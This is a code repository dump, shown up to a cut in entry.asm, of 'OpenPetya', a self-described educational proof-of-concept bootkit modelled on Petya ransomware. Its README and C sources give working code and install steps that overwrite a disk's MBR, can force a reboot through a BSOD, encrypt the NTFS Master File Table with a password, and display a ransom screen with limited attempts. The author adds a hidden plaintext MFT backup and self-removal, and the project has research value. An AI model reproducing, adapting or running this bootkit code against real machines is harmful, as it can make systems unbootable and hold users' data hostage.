@@ -1,0 +1,4917 @@
+Project Path: arc_iss4cf0ng_OpenPetya_lnuiaptm
+
+Source Tree:
+
+```txt
+arc_iss4cf0ng_OpenPetya_lnuiaptm
+├── LICENSE
+├── README.md
+├── bootloader
+│   ├── ata.c
+│   ├── ata.h
+│   ├── bignum.c
+│   ├── bignum.h
+│   ├── bootloader.c
+│   ├── bootloader.h
+│   ├── entry.asm
+│   ├── hidden_store.c
+│   ├── hidden_store.h
+│   ├── io.h
+│   ├── kdf.c
+│   ├── kdf.h
+│   ├── keyboard.c
+│   ├── keyboard.h
+│   ├── linker.ld
+│   ├── ntfs.c
+│   ├── ntfs.h
+│   ├── ntfs_crypt.c
+│   ├── ntfs_crypt.h
+│   ├── password_store.c
+│   ├── password_store.h
+│   ├── petya.c
+│   ├── petya.h
+│   ├── salsa20.c
+│   ├── salsa20.h
+│   ├── state.c
+│   ├── state.h
+│   ├── types.h
+│   ├── utils.c
+│   └── utils.h
+├── build.sh
+├── main
+│   └── OpenPetya.cpp
+├── makefile
+└── mbr
+    └── mbr.asm
+
+```
+
+`LICENSE`:
+
+```
+MIT License
+
+Copyright (c) 2026 ISSAC
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
+
+```
+
+`README.md`:
+
+```md
+# OpenPetya
+
+A Proof-of-Concept bootkit inspired by Petya ransomware, written in Assembly, C, and C++
+
+<p align="center">
+    <img src="https://iss4cf0ng.github.io/images/meme/Rio/4.png" width=200/>
+</p>
+
+If you find this project helpful or informative, I would truly appreciate a ⭐ on the repository. Your support would be a great motivation for me to continue improving this tool.
+
+# Overview
+
+OpenPetya is an educational project designed to study how bootkits and low-level ransomware operate internally.
+
+<p align="center">
+    <img src="https://iss4cf0ng.github.io/images/article/2026-5-23-OpenPetya/5.png" width=700/>
+</p>
+
+The project focuses on:
+- custom MBR bootloading
+- multi-stage boot process
+- Protected Mode transition
+- NTFS Master File Table (MFT) encryption
+- Salsa20-based cryptography
+- password validation and restoration workflow
+
+OpenPetya is **NOT** intended to be an exact reimplementation of either Petya or NotPetya. Instead, it is a simplified Proof-of-Concept designed for learning and research purposes.
+
+It is worth mentioning that OpenPetya does not include Command-and-Control (C2) functionality. In addition, OpenPetya stores plaintext MFT backup data inside hidden sectors after encryption. This behavior is intentionally designed for educational purposes because those features are relatively trival compared to the core bootloader and cryptographic mechanisms implemented in this project. However, you can still modify or remove these features if necessary.
+
+---
+
+# Project Motivation
+
+Over the past few months, I have been studying:
+- malware analysis
+- bootloaders
+- rootkits and bootkits
+- Windows internals
+- operating system fundamentals
+- low-level Assembly programming
+
+While researching Petya and NotPetya, I realized that many online resources only briefly explain the overall workflow without demonstrating how the underlying boot process actually works.
+
+In addition, many existing Petya-related projects rely on extracted bootloader binaries or modified original components rather than implementing the logic from scratch.
+
+Therefore, I decided to develop OpenPetya as a practical project for understanding:
+- how custom MBR bootkits work
+- how stage-2 bootloaders operate
+- how disk encryption workflows function
+- how password validation and restoration mechanisms are implemented
+
+The project also serves as part of my ongoing research into bootkits, low-level malware, and operating system internals.
+
+Related articles:
+- [Analyzing Petya](https://iss4cf0ng.github.io/2026/04/12/2026-4-12-Petya/)
+- [Analyzing NotPetya](https://iss4cf0ng.github.io/2026/04/13/2026-4-13-NotPetya/)
+- [Simple MBR And Bootloader](https://iss4cf0ng.github.io/2026/04/08/2026-4-8-MbrAndBootLoader/)
+- [OpenBootloader](https://iss4cf0ng.github.io/2026/05/10/2026-5-10-OpenBootloader/)
+- [Rootkits and Bootkits Notes](https://iss4cf0ng.github.io/2026/04/28/2026-4-28-RootkitAndBootkit/)
+- [PC Assembly Language Notes](https://iss4cf0ng.github.io/2026/04/21/2026-4-21-PcAsmLang/)
+- [Serious Cryptography Notes](https://iss4cf0ng.github.io/2026/05/16/2026-5-16-SeriousCryptography/)
+
+---
+
+# Features
+
+- **Custom MBR**
+  
+  OpenPetya uses a custom Master Boot Record (MBR) to load the stage-2 payload.
+
+- **Custom Stage-2 Bootloader**
+  
+  The stage-2 bootloader contains the core functionality of the project, including:
+  - Salsa20 encryption/decryption
+  - password validation
+  - restoration logic
+  - user interface
+
+- **Protected Mode Transition**
+  
+  The bootloader switches from 16-bit Real Mode to 32-bit Protected Mode before executing higher-level logic.
+
+- **MFT Encryption**
+  
+  Similar to the original Petya, OpenPetya encrypts critical parts of the NTFS Master File Table (MFT) using Salsa20.
+
+- **Password Validation**
+  
+  OpenPetya validates the input password before decryption to prevent irreversible corruption caused by invalid keys.
+
+- **Automatic Restoration**
+  
+  Once the correct password is entered:
+  - encrypted data is restored
+  - the original boot chain is recovered
+  - OpenPetya removes itself automatically
+
+---
+
+# Components
+
+## `OpenPetya.exe`
+
+User-mode installer and controller application.
+
+Functions:
+- drive selection
+- installation
+- reboot triggering
+- utility interface
+
+## `mbr.bin`
+
+Custom Master Boot Record (MBR) code responsible for:
+- stage-2 loading
+- early boot execution
+
+## `stage2.bin`
+
+The core payload of OpenPetya.
+
+Responsibilities:
+- Protected Mode transition
+- Salsa20 cryptographic operations
+- MFT encryption/decryption
+- password validation
+- restoration
+- boot-time interface
+
+---
+
+# Workflow
+
+The workflow of OpenPetya is summarized below.
+
+1. Users install OpenPetya using `OpenPetya.exe` and choose a password.
+
+2. The machine is rebooted manually or through the BSOD (via `NtRaiseHardError`) mechanism provided by the installer.
+
+3. During boot, the custom MBR loads the stage-2 payload.
+
+4. The stage-2 payload switches the CPU into Protected Mode.
+
+5. OpenPetya encrypts selected parts of the NTFS Master File Table (MFT).
+
+6. After encryption, the machine reboots again.
+
+7. A boot-time interface prompts the user for the password.
+
+8. If the password is correct:
+   - encrypted data is decrypted
+   - the original boot chain is restored
+   - OpenPetya removes itself automatically
+
+9. Windows boots normally again.
+
+> Unlike the original Petya ransomware, OpenPetya does not attempt to deceive users with fake CHKDSK screens or social engineering behavior. The project is designed purely for educational and research purposes.
+
+---
+
+# Build
+
+You can build the project using the commands below.
+
+```bash
+make            # Build mbr.bin and stage2.bin
+./build.exe     # Build OpenPetya.exe
+```
+
+# Usage
+
+<p align="center">
+    <img src="https://iss4cf0ng.github.io/images/article/2026-5-23-OpenPetya/6.png" width=700/>
+</p>
+
+> Warning: Please execute it in your virtual machine!
+
+The commands below shows how to install custom MBR and stage-2 bootloader (Administrative privilege is required):
+
+```batch
+OpenPetya.exe --list
+OpenPetya.exe --drive 0 --install mbr.bin stage2.bin
+```
+
+# Technical Notes
+
+Detailed explanations about:
+- MBR boot process
+- Real Mode and Protected Mode
+- Salsa20 implementation
+- MFT encryption workflow
+- bootkit design
+- More discussions about Petya and NotPetya
+- How to use undocumented APIs (such as `NtRaiseHardError`)
+
+Are documented in [this article](https://iss4cf0ng.github.io/2026/05/23/2026-5-23-OpenPetya/).
+
+# Disclaimer
+
+This project was developed purely for educational and research purposes.
+
+The goal of OpenPetya is to study:
+
+- bootkits
+- operating system internals
+- low-level malware techniques
+- bootloader architecture
+
+Do **NOT** use this project for illegal activities or against systems you do not own or explicitly have permission to test.
+
+The author is **NOT** responsible for any misuse of this software.
+
+# Demonstration (Windows 7)
+
+## Screenshots
+
+<p align="center">
+    <img src="https://iss4cf0ng.github.io/images/article/2026-5-23-OpenPetya/4.png" width=800/>
+</p>
+
+## Runtime Demo
+
+<p align="center">
+    <img src="https://iss4cf0ng.github.io/images/article/2026-5-23-OpenPetya/demo.gif" width=800/>
+</p>
+
+# Future Plans
+
+- Improved recovery workflow
+- Better NTFS parsing
+- More accurate Petya behavior simulation
+- UEFI experiments
+- Additional bootkit research
+- Full-screen Graphics Mode
+- Windows 10 support
+
+# Thanks
+
+Thanks for checking out this project. Feedback and suggestions are welcome.
+```
+
+`bootloader/ata.c`:
+
+```c
+// ata.c
+// Disk I/O via BIOS INT 13h Extended (through real-mode trampoline)
+
+#include "ata.h"
+#include "io.h"
+#include "types.h"
+#include "bootloader.h"
+
+static uint8_t g_drive = 0x80;
+
+void ata_set_drive(uint8_t drive)
+{
+    g_drive = drive;
+}
+
+// Parameter block layout at physical address 0x7E00:
+// [0x7E00] uint8_t  function   (0x42=read, 0x43=write, 0x41=check)
+// [0x7E01] uint8_t  drive
+// [0x7E02] uint8_t  cf_result  (filled by trampoline: 1=error)
+// [0x7E03] uint8_t  ah_result  (filled by trampoline: error code)
+// [0x7E04] uint8_t  padding[12]
+// [0x7E10] DAP[16 bytes]       (the actual disk address packet)
+
+#define PARAM_BASE   ((volatile uint8_t *)0x7E00)
+#define PARAM_FUNC   (PARAM_BASE + 0)
+#define PARAM_DRIVE  (PARAM_BASE + 1)
+#define PARAM_CF     (PARAM_BASE + 2)
+#define PARAM_AH     (PARAM_BASE + 3)
+#define DAP_BASE     ((volatile uint8_t *)0x7E10)
+
+typedef struct __attribute__((packed))
+{
+    uint8_t  size;
+    uint8_t  reserved;
+    uint16_t count;
+    uint16_t offset;
+    uint16_t segment;
+    uint64_t lba;
+} DAP;
+
+// Declared in entry.asm
+extern void rm_call_int13(void);
+
+#define BOUNCE_BUFFER      0x6000   // move it lower
+#define BOUNCE_BUFFER_SIZE 4096     // 8 sectors max
+
+static void setup_dap(uint32_t lba, uint8_t count)
+{
+    volatile DAP *dap = (volatile DAP *)DAP_BASE;
+    dap->size = 0x10;
+    dap->reserved = 0x00;
+    dap->count = count;
+    dap->segment = (uint16_t)(BOUNCE_BUFFER >> 4);
+    dap->offset = (uint16_t)(BOUNCE_BUFFER & 0x0F);
+    dap->lba = (uint64_t)lba;
+}
+
+static int call_int13(uint8_t func, uint32_t lba, uint8_t count, uint32_t flat_addr)
+{
+    if ((uint32_t)count * 512 > BOUNCE_BUFFER_SIZE)
+    {
+        vga_puts("call_int13: count too large!\n");
+        return -1;
+    }
+
+    // for writes: copy to bounce buffer first
+    if (func == 0x43)
+    {
+        uint8_t *src = (uint8_t *)flat_addr;
+        uint8_t *dst = (uint8_t *)BOUNCE_BUFFER;
+        for (uint32_t i = 0; i < (uint32_t)count * 512; i++)
+            dst[i] = src[i];
+    }
+
+    *PARAM_FUNC = func;
+    *PARAM_DRIVE = g_drive;
+    *PARAM_CF = 0;
+    *PARAM_AH = 0;
+
+    setup_dap(lba, count);
+    rm_call_int13();
+
+    if (*PARAM_CF)
+    {
+        vga_puts("INT13 error AH=");
+        vga_put_hex(*PARAM_AH);
+        vga_puts(" LBA=");
+        vga_put_hex(lba);
+        vga_putchar('\n');
+        return -1;
+    }
+
+    // for reads: copy from bounce buffer to destination
+    if (func == 0x42)
+    {
+        uint8_t *src = (uint8_t *)BOUNCE_BUFFER;
+        uint8_t *dst = (uint8_t *)flat_addr;
+        for (uint32_t i = 0; i < (uint32_t)count * 512; i++)
+            dst[i] = src[i];
+    }
+
+    return 0;
+}
+
+int ata_init(void)
+{
+    vga_puts("ATA: Checking INT 13h for drive ");
+    vga_put_hex(g_drive);
+    vga_putchar('\n');
+
+    // use function 0x41 (check extensions), DAP not needed, just checks support
+    *PARAM_FUNC = 0x41;
+    *PARAM_DRIVE = g_drive;
+    *PARAM_CF = 0;
+    *PARAM_AH = 0;
+
+    // handle this as a special case in trampoline
+    static uint8_t scratch[512];
+    if (call_int13(0x42, 0, 1, (uint32_t)scratch) != 0)
+    {
+        vga_puts("ATA: INT 13h read test failed!\n");
+        return -1;
+    }
+
+    vga_puts("ATA: Ready.\n");
+    return 0;
+}
+
+int ata_read(uint32_t lba, uint8_t count, uint8_t *buffer)
+{
+    return call_int13(0x42, lba, count, (uint32_t)buffer);
+}
+
+int ata_write(uint32_t lba, uint8_t count, const uint8_t *buffer)
+{
+    // Copy to bounce buffer first, then write
+    uint8_t *dst = (uint8_t *)BOUNCE_BUFFER;
+    uint32_t bytes = (uint32_t)count * 512;
+    for (uint32_t i = 0; i < bytes; i++)
+        dst[i] = buffer[i];
+
+    return call_int13(0x43, lba, count, BOUNCE_BUFFER);
+}
+```
+
+`bootloader/ata.h`:
+
+```h
+// ata.h
+
+#ifndef ATA_H
+#define ATA_H
+
+#include "types.h"
+
+void ata_set_drive(uint8_t drive);
+int  ata_init(void);
+int  ata_read(uint32_t lba, uint8_t count, uint8_t *buffer);
+int  ata_write(uint32_t lba, uint8_t count, const uint8_t *buffer);
+
+#endif
+```
+
+`bootloader/bignum.c`:
+
+```c
+// bignum.c
+
+
+```
+
+`bootloader/bignum.h`:
+
+```h
+// bignum.h
+
+
+```
+
+`bootloader/bootloader.c`:
+
+```c
+// bootloader.c
+// Standard libraries are not available, so they have to be purely implemented
+
+#include "bootloader.h"
+#include "io.h"
+#include "keyboard.h"
+#include "types.h"
+#include "utils.h"
+#include "ata.h"
+#include "state.h"
+#include "ntfs_crypt.h"
+#include "hidden_store.h"
+#include "password_store.h"
+#include "petya.h"
+
+#define MAX_ATTEMPTS 3
+#define MAX_PW_LEN 32
+
+#define VGA_BASE ((volatile uint16_t *)0xB8000)
+#define VGA_COLS 80
+#define VGA_ROWS 25
+
+// Reference: https://grokipedia.com/page/BIOS_color_attributes
+#define COLOR_WHITE_ON_BLACK    0x07
+#define COLOR_GREEN_ON_BLACK    0x0A
+#define COLOR_CYAN_ON_BLACK     0x0B
+#define COLOR_YELLOW_ON_BLACK   0x0E
+#define COLOR_WHITE_ON_BLUE     0x1F
+#define COLOR_GRAY_ON_RED       0x49
+#define COLOR_WHITE_ON_RED      0x4F
+#define COLOR_RED_ON_BLACK      0x0C
+#define COLOR_DARKRED_ON_BLACK  0x04
+
+// Global variables
+static int cursor_row = 0;
+static int cursor_col = 0;
+static uint8_t current_color = COLOR_WHITE_ON_BLACK;
+
+static void update_cursor(void)
+{
+    uint16_t pos = cursor_row * VGA_COLS + cursor_col;
+    outb(0x3D4, 0x0F);
+    outb(0x3D5, (uint8_t)(pos & 0xFF));
+    outb(0x3D4, 0x0E);
+    outb(0x3D5, (uint8_t)((pos >> 8) & 0xFF));
+}
+
+static void scroll(void)
+{
+    volatile uint16_t *vga = VGA_BASE;
+
+    for (int row = 0; row < VGA_ROWS - 1; row++)
+        for (int col = 0; col < VGA_COLS; col++)
+            vga[row * VGA_COLS + col] = vga[(row + 1) * VGA_COLS + col];
+
+    uint16_t blank = ' ' | ((uint16_t)current_color << 8);
+    for (int col = 0; col < VGA_COLS; col++)
+        vga[(VGA_ROWS - 1) * VGA_COLS + col] = blank;
+    cursor_row = VGA_ROWS - 1;
+}
+
+static void itoa(uint32_t n, char *buf, int base)
+{
+    const char digits[] = "0123456789ABCDEF";
+    char tmp[32];
+    int i = 0;
+    if (n == 0)
+    {
+        buf[0] = '0';
+        buf[1] = '\0';
+        return;
+    }
+
+    while (n > 0)
+    {
+        tmp[i++] = digits[n % base];
+        n /= base;
+    }
+
+    int j = 0;
+    while (i > 0)
+        buf[j++] = tmp[--i];
+
+    buf[j] = '\0';
+}
+
+static void draw_line(void)
+{
+    for (int i = 0; i < VGA_COLS; i++)
+        vga_putchar('-');
+}
+
+static void get_cpu_vendor(char *out) {
+    uint32_t ebx, ecx, edx;
+
+    __asm__ volatile (
+        "cpuid"
+        : "=b"(ebx), "=c"(ecx), "=d"(edx)
+        : "a"(0)
+    );
+
+    uint32_t *p = (uint32_t *)out;
+    p[0] = ebx;
+    p[1] = edx;
+    p[2] = ecx;
+    
+    out[12] = '\0';
+}
+
+static uint32_t find_ntfs_partition_lba(void)
+{
+    uint8_t mbr[512];
+    if (ata_read(0, 1, mbr) != 0)
+    {
+        vga_puts("Cannot read MBR!\n");
+        return 0;
+    }
+
+    // Check boot signature
+    if (mbr[510] != 0x55 || mbr[511] != 0xAA)
+    {
+        vga_puts("Invalid MBR signature!\n");
+        return 0;
+    }
+
+    // Scan partition table (4 entries at offset 0x1BE, 16 bytes each)
+    uint32_t best_lba = 0;
+    uint32_t best_size = 0;
+
+    for (int i = 0; i < 4; i++)
+    {
+        uint8_t *entry = mbr + 0x1BE + i * 16;
+        uint8_t  type  = entry[4];
+        uint32_t lba   = entry[8]  | ((uint32_t)entry[9]  << 8)
+                       | ((uint32_t)entry[10] << 16) | ((uint32_t)entry[11] << 24);
+        uint32_t size  = entry[12] | ((uint32_t)entry[13] << 8)
+                       | ((uint32_t)entry[14] << 16) | ((uint32_t)entry[15] << 24);
+
+        if (type != 0x07)   // 0x07 = NTFS/exFAT
+            continue;
+
+        vga_puts("  Found NTFS partition: LBA=");
+        vga_put_dec(lba);
+        vga_puts(" size=");
+        vga_put_dec(size);
+        vga_putchar('\n');
+
+        // Pick the largest NTFS partition (most likely to be Windows)
+        if (size > best_size)
+        {
+            best_size = size;
+            best_lba  = lba;
+        }
+    }
+
+    if (best_lba == 0)
+        vga_puts("No NTFS partition found!\n");
+    else
+    {
+        vga_puts("Selected partition LBA=");
+        vga_put_dec(best_lba);
+        vga_putchar('\n');
+    }
+
+    return best_lba;
+}
+
+void vga_clear(void)
+{
+    volatile uint16_t *vga = VGA_BASE;
+    uint16_t blank = ' ' | (current_color << 8);
+    for (int i = 0; i < VGA_COLS * VGA_ROWS; i++)
+        vga[i] = blank;
+    cursor_row = cursor_col = 0;
+    update_cursor();
+}
+
+void vga_putchar(char c)
+{
+    volatile uint16_t *vga = VGA_BASE;
+
+    if (c == '\b')
+    {
+        if (cursor_col > 0)
+        {
+            cursor_col--;
+        }
+        else if (cursor_row > 0)
+        {
+            cursor_row--;
+            cursor_col = VGA_COLS - 1;
+        }
+
+        vga[cursor_row * VGA_COLS + cursor_col] = ' ' | ((uint16_t)current_color << 8);
+        update_cursor();
+
+        return;
+    }
+    else if (c == '\n')
+    {
+        cursor_col = 0;
+        cursor_row++;
+    }
+    else if (c == '\r')
+    {
+        cursor_col = 0;
+    }
+    else if (c == '\t')
+    {
+        cursor_col = (cursor_col + 8) & ~7;
+    }
+    else
+    {
+        vga[cursor_row * VGA_COLS + cursor_col] = (uint8_t)c | ((uint16_t)current_color << 8);
+        cursor_col++;
+    }
+
+    if (cursor_col >= VGA_COLS) {
+        cursor_col = 0;
+        cursor_row++;
+    }
+
+    if (cursor_row >= VGA_ROWS)
+        scroll();
+
+    update_cursor();
+}
+
+void vga_puts(const char *s)
+{
+    while (*s)
+        vga_putchar(*s++);
+}
+
+void vga_putchar_at(int row, int col, char c)
+{
+    volatile uint16_t *vga = VGA_BASE;
+
+    if (row < 0 || row >= VGA_ROWS)
+        return;
+
+    if (col < 0 || col >= VGA_COLS)
+        return;
+
+    vga[row * VGA_COLS + col] = (uint8_t)c | ((uint16_t)current_color << 8);
+}
+
+void vga_draw_centered_ascii(const char *art)
+{
+    int lines = 1;
+    int max_width = 0;
+    int current_width = 0;
+
+    for (const char *p = art; *p; p++)
+    {
+        if (*p == '\n')
+        {
+            if (current_width > max_width)
+                max_width = current_width;
+
+            current_width = 0;
+            lines++;
+        }
+        else
+        {
+            current_width++;
+        }
+    }
+
+    if (current_width > max_width)
+        max_width = current_width;
+
+    int start_row = (VGA_ROWS - lines) / 2;
+
+    int row = start_row;
+
+    const char *line_start = art;
+
+    while (*line_start)
+    {
+        int line_len = 0;
+
+        while (line_start[line_len] && line_start[line_len] != '\n')
+        {
+            line_len++;
+        }
+
+        int start_col = (VGA_COLS - line_len) / 2;
+
+        for (int i = 0; i < line_len; i++)
+        {
+            vga_putchar_at(row, start_col + i, line_start[i]);
+        }
+
+        row++;
+
+        line_start += line_len;
+
+        if (*line_start == '\n')
+            line_start++;
+    }
+}
+
+void vga_set_color(uint8_t color)
+{
+    current_color = color;
+}
+
+void vga_put_dec(uint32_t n)
+{
+    char buf[16];
+    itoa(n, buf, 10);
+    vga_puts(buf);
+}
+
+void vga_put_hex(uint32_t n)
+{
+    char buf[16];
+    vga_puts("0x");
+    itoa(n, buf, 16);
+    vga_puts(buf);
+}
+
+void wipe_out_bootloader(void)
+{
+    uint8_t zero[512] = { 0 };
+
+    vga_puts("Removing the bootloader...\n");
+
+    for (int i = 1; i <= 16; i++)
+        ata_write(i, 1, zero);
+
+    // Wipe state/tag/salt (sector 60-62)
+    ata_write(60, 1, zero);
+    ata_write(61, 1, zero);
+    ata_write(62, 1, zero);
+
+    vga_puts("Done.\n");
+}
+
+void do_encryption(void)
+{
+    vga_clear();
+
+    vga_set_color(COLOR_WHITE_ON_BLUE);
+    vga_puts("OpenPetya, 1st stage.");
+    vga_set_color(COLOR_WHITE_ON_BLACK);
+    vga_puts("\n\n");
+
+    vga_set_color(COLOR_YELLOW_ON_BLACK);
+    vga_puts("First boot detected. Setting up encryption...\n");
+    vga_set_color(COLOR_WHITE_ON_BLACK);
+
+    // Init hidden store with disk size from state sector
+    uint64_t disk_size = state_read_disk_size();
+    if (disk_size == 0)
+    {
+        vga_set_color(COLOR_RED_ON_BLACK);
+        vga_puts("ERROR: Disk size is not set by installer.\n");
+
+        goto halt;
+    }
+
+    vga_puts("Detecting NTFS partition...\n");
+    uint32_t partition_lba = find_ntfs_partition_lba();
+    if (partition_lba == 0)
+    {
+        vga_set_color(COLOR_RED_ON_BLACK);
+        vga_puts("ERROR: No NTFS partition found!\n");
+
+        goto halt;
+    }
+
+    hidden_store_init(disk_size);
+
+    vga_puts("[1/4] Backing up MFT to hidden area...\n");
+    if (hidden_backup_mft(partition_lba) != 0)
+    {
+        vga_set_color(COLOR_RED_ON_BLACK);
+        vga_puts("ERROR: MFT backup failed!\n");
+
+        goto halt;
+    }
+
+    vga_puts("[2/4] Generating salt...\n");
+    if (ntfs_generate_salt() != 0)
+    {
+        vga_set_color(COLOR_RED_ON_BLACK);
+        vga_puts("ERROR: Salt generation failed!\n");
+        
+        goto halt;
+    }
+
+    vga_puts("[3/4] Encrypting MFT...\n");
+    char password[65];
+    if (pwstore_read(password, sizeof(password)) != 0)
+    {
+        vga_set_color(COLOR_RED_ON_BLACK);
+        vga_puts("Error: No password in sector 59.\n");
+
+        goto halt;
+    }
+
+    if (ntfs_mft_encrypt(password, partition_lba) != 0)
+    {
+        zero_buffer(password, sizeof(password));
+
+        vga_set_color(COLOR_RED_ON_BLACK);
+        vga_puts("ERROR: MFT encryption failed!\n");
+
+        goto halt;
+    }
+
+    zero_buffer(password, sizeof(password));
+    pwstore_erase();
+
+    vga_puts("[4/4] Saving state...\n");
+    if (state_write(STATE_ENCRYPTED) != 0)
+    {
+        vga_set_color(COLOR_RED_ON_BLACK);
+        vga_puts("ERROR: State save failed!\n");
+
+        goto halt;
+    }
+
+    uint8_t raw[512];
+    ata_read(60, 1, raw);
+    vga_puts("Final state check: magic=");
+    vga_put_hex(*(uint32_t *)raw);
+    vga_puts(" state=");
+    vga_put_hex(raw[4]);
+    vga_putchar('\n');
+
+    vga_puts("Rebooting...\n");
+    for (volatile uint32_t _i = 0; _i < 15000000; _i++);
+
+    vga_set_color(COLOR_GREEN_ON_BLACK);
+    vga_puts("\nSetup complete! Rebooting in 3 seconds...\n");
+    
+    for (volatile uint32_t _i = 0; _i < 15000000; _i++);
+
+    do_reboot();
+
+halt:
+    vga_set_color(COLOR_RED_ON_BLACK);
+    vga_puts("\nSetup failed. System halted.\n");
+    vga_puts("Re-install the bootloader to try again.\n");
+
+     __asm__ volatile ("cli\n.Lhalt1: hlt\njmp .Lhalt1\n");
+    __builtin_unreachable();
+}
+
+void login(void)
+{
+    vga_clear();
+
+    vga_set_color(COLOR_WHITE_ON_BLUE);
+    vga_puts("OpenPetya");
+    vga_puts("\n\n");
+
+    vga_set_color(COLOR_WHITE_ON_BLACK);
+
+    char input[MAX_PW_LEN];
+    int attempts = 0;
+
+    vga_puts("Detecting NTFS partition...\n");
+    uint32_t partition_lba = find_ntfs_partition_lba();
+    if (partition_lba == 0)
+    {
+        vga_set_color(COLOR_RED_ON_BLACK);
+        vga_puts("ERROR: No NTFS partition found!\n");
+
+        goto halt;
+    }
+
+    // NiHaHaHaHa
+    int flag = 0;
+    while (1)
+    {
+        vga_clear();
+        vga_set_color(flag == 0 ? COLOR_GRAY_ON_RED : COLOR_WHITE_ON_RED);
+
+        flag = flag ? 0 : 1;
+
+        vga_draw_centered_ascii("NiHaHaHaHa\n(Press any key to NiHaHaHaHa)");
+
+        if (keyboard_hashkey())
+            break;
+
+        sleep(100);
+    }
+
+    keyboard_getchar();
+
+    vga_set_color(COLOR_WHITE_ON_RED);
+    vga_clear();
+    vga_puts(RANSOM_MSG);
+    vga_putchar('\n');
+
+    // Enter your password
+    while (attempts < MAX_ATTEMPTS)
+    {
+        vga_puts("Attempts remaining: ");
+        vga_put_dec(MAX_ATTEMPTS - attempts);
+        vga_putchar('\n');
+
+        vga_puts("Password: ");
+        keyboard_readline(input, MAX_PW_LEN);
+
+        if (ntfs_mft_decrypt(input, partition_lba) == 0)
+        {
+            vga_set_color(COLOR_WHITE_ON_BLACK);
+            vga_clear();
+
+            zero_buffer(input, MAX_PW_LEN);
+
+            vga_set_color(COLOR_GREEN_ON_BLACK);
+            vga_puts("\nAccess granted!\n\n");
+            vga_set_color(COLOR_WHITE_ON_BLACK);
+
+            uint64_t disk_size = state_read_disk_size();
+            hidden_store_init(disk_size);
+
+            vga_puts("[1/4] Restoring original MFT...\n");
+            if (hidden_restore_mft(partition_lba) != 0)
+            {
+                vga_set_color(COLOR_RED_ON_BLACK);
+                vga_puts("ERROR: MFT restore failed!\n");
+                vga_puts("System halted to prevent data loss.\n");
+
+                goto halt;
+            }
+
+            vga_puts("[2/4] Restoring original MBR...\n");
+            uint8_t mbr_buffer[512];
+            if (ata_read(63, 1, mbr_buffer) == 0)
+            {
+                uint8_t current[512]; // current partition table
+                ata_read(0, 1, current);
+
+                for (int i = 0; i < 446; i++)
+                    current[i] = mbr_buffer[i];
+
+                current[510] = 0x55;
+                current[511] = 0xAA;
+
+                ata_write(0, 1, current);
+                vga_puts("Original MBR was restored.\n");
+            }
+            else
+            {
+                vga_puts("Warning: Could not read MBR backup.\n");
+            }
+
+            vga_puts("[3/4] Removing custom bootloader...\n");
+            wipe_out_bootloader();
+            hidden_wipe();
+
+            uint8_t zero[512] = { 0 };
+            ata_write(63, 1, zero);
+
+            vga_set_color(COLOR_GREEN_ON_BLACK);
+            vga_puts("\n[4/4] Booting Windows...\n");
+            vga_puts("Custom bootloader has been removed.\n");
+
+            for (volatile uint32_t _i = 0; _i < 15000000; _i++);
+
+            do_chainload();
+        }
+
+        zero_buffer(input, MAX_PW_LEN);
+        vga_puts("Wrong pasword.\n\n");
+
+        attempts++;
+    }
+
+halt:
+    vga_puts("System halted.\n");
+    __asm__ volatile ("cli\n.Lhalt_login: hlt\njmp .Lhalt_login\n");
+    __builtin_unreachable();
+}
+
+void bootloader_main(uint32_t boot_drive)
+{
+    vga_clear();
+    ata_set_drive((uint8_t)boot_drive);
+
+    if (ata_init() != 0)
+    {
+        vga_set_color(COLOR_RED_ON_BLACK);
+        vga_puts("FATAL: ATA initialization failed!\n");
+        __asm__ volatile ("cli\n.Lhalt0: hlt\njmp .Lhalt0\n");
+    }
+
+    // Read and display raw state sector before deciding what to do
+    uint8_t raw[512];
+    if (ata_read(60, 1, raw) == 0)
+    {
+        vga_puts("State sector: magic=");
+        vga_put_hex(*(uint32_t *)raw);
+        vga_puts(" state=");
+        vga_put_hex(raw[4]);
+        vga_puts(" disk_sectors=");
+        vga_put_dec(*(uint32_t *)(raw + 8));
+        vga_putchar('\n');
+    }
+    else
+    {
+        vga_puts("State sector: READ FAILED\n");
+    }
+
+    vga_set_color(COLOR_WHITE_ON_BLACK);
+    vga_puts("BSS end: ");
+    vga_put_hex((uint32_t)&__bss_end);
+    vga_putchar('\n');
+    vga_puts("ESP: ");
+    uint32_t esp_val;
+    __asm__ volatile ("mov %%esp, %0" : "=r"(esp_val));
+    vga_put_hex(esp_val);
+    vga_putchar('\n');
+
+    uint8_t s = state_read();
+    vga_puts("state_read() returned: ");
+    vga_put_hex(s);
+    vga_putchar('\n');
+
+    if (s == STATE_NOT_SETUP)
+        do_encryption();
+    else
+        login();
+
+    __builtin_unreachable();
+}
+```
+
+`bootloader/bootloader.h`:
+
+```h
+// bootloader.h
+// Header file
+
+#ifndef BOOTLOADER_H
+#define BOOTLOADER_H
+
+#include "types.h"
+
+#define NULL ((void *)0)
+
+void vga_clear(void);
+void vga_putchar(char c);
+void vga_puts(const char *s);
+void vga_putchar_at(int row, int col, char c);
+void vga_draw_centered_ascii(const char *art);
+void vga_set_color(uint8_t color);
+void vga_put_dec(uint32_t n);
+void vga_put_hex(uint32_t n);
+
+void bootloader_main(uint32_t boot_drive);
+
+void do_chainload(void) __attribute__((noreturn));
+void do_reboot(void) __attribute__((noreturn));
+
+extern char __bss_start[];
+extern char __bss_end[];
+
+#endif
+
+```
+
+`bootloader/entry.asm`:
+
+```asm
+; entry.asm
+; Stage 2 entry point
+; Switch 16-bit Real Mode to 32-bit Protected Mode, call bootloader_main() written in C
+
+[BITS 16]
+
+extern bootloader_main
+extern __bss_start
+extern __bss_end
+
+global _start
+global do_chainload
+global do_reboot
+global rm_call_int13
+
+CODE_SEL equ 0x08
